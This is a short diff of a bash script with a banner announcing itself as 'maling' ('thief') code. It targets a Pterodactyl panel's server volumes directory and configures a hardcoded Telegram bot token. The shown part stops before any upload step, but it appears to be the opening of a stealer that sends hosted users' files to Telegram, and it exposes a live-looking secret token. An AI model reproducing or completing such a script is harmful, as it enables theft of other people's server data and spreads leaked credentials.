@@ -1,4 +1,18 @@
 #!/bin/bash
+
+clear
+echo -e "\e[1;31m"
+cat << "EOF"
+ __  __    _    _      _____ _   _  ____   ____   ____  ____  
+|  \/  |  / \  | |    |_   _| | | |/ ___| |  _ \ / ___||  _ \ 
+| |\/| | / _ \ | |      | | | |_| | |     | |_) | |    | | | |
+| |  | |/ ___ \| |___   | | |  _  | |___  |  __/| |___ | |_| |
+|_|  |_/_/   \_\_____|  |_| |_| |_|\____| |_|    \____||____/ 
+                                                             
+                     [ M A L I N G   S C ]
+EOF
+echo -e "\e[0m"
+
 cd /var/lib/pterodactyl/volumes
 # === CONFIG TELEGRAM ===
 BOT_TOKEN="7764774217:AAHwpnX3xh4TCY9A7X-fJHNuocEbQ05Pzeg"
